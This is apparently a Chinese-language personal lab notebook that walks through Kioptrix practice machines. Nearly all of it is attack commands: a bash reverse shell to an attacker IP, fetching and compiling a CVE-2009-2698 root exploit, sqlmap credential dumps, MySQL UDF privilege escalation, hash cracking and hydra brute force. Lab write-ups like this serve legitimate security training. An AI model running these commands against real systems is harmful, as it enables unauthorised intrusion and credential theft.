---
date: 2022-08-01-星期一 14:13:24
update: 
tags: [time/year2022,time/month08]
id: 20220801141324
---

# easy
## kioptrix2
### 主机发现
arp-scan -l
### 端口扫描
nmap -p- -A 
Nikto 扫描以识别有关在端口 80 上运行的 Web 服务器的基本信息。
### 漏洞发现
#### sql注入
#### 命令执行
发现有命令执行
#### 反弹shell
| bash -i >& /dev/tcp/192.168.101.42(攻击机)/1234 0>&1
#### 连接shell
nc -nvlp 1234
### 提权
 lsb_release -a 查看发行版本版本信息

searchsploits  centos 4.5
searchsploits - m  9542.c
#### python开启http
python -m http.server
靶机下载exp
wget 192.168.101.42:8000/9542.c
根据提示 编译exp gcc -o 0x82-CVE-2009-2698 9542.c && ./0x82-CVE-2009-2698
id 获得root




## kioptrix3
主机发现端口扫描目录扫描后续靶机简单赘述
22
80
### 漏洞发现/利用
发现cms有漏洞
use exploit/multi/http/lcms_php_exec
set payload generic/shell_reverse_tcp
set 
python -c 'import pty;pty.spawn("/bin/bash")'  获取完全交互式 shell
find . -name "*config.php"
登录phpmyadmin
获取
账号和密码
哈希破解
hashid 哈希值
echo -n | wc -c 多少位
cat user:password(hash)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5
加强shell

ssh loneferret@192.168.101.48
starwars 
### 权限提升

sudo-l
export TERM=xterm
修改 /etc/sudoers文件
、

## kioptrix3
22
80
139

nmap -sC –script=smb-enum-users 192.168.36.134 //smb枚举
smbclient -L //爆破登录

### 漏洞发现nikto -host
#### sql注入.

burp抓包保存请求 sql..txt
sqlmap -r sql.txt  --batch --level 3 --current-user
sqlmap -r sql.txt  --batch --level 3 --current-dbs
sqlmap -r sql.txt --batch --dbs  --level 3 
sqlmap -r sql.txt  --batch --level 3 -D members --tables
sqlmap -r sql.txt  --batch --level 3 -D members -T members --columns 
sqlmap -r sql.txt  --batch --level 3 -D members -T members -C 'username,password' --dump
#### ssh尝试登录
ssh john@
MyNameIsJohn
 加强shell
echo os.system(‘/bin/bash’)
#### 提权
查看root运行的服务
ps -ef | grep root |
ps -ef | grep root | grep mysql
发现mysql为root运行的
 /var/www 目录的配置文件
mysql udf提权

ls -la /usr/lib/lib_mysqludf_sys.so
mysql -h localhost -u root -p
SELECT * FROM mysql.func；
select sys_exec('usermod -a -G admin john');
# 
![](Pasted%20image%2020220802160750.png)

smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.223.133

hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.223.133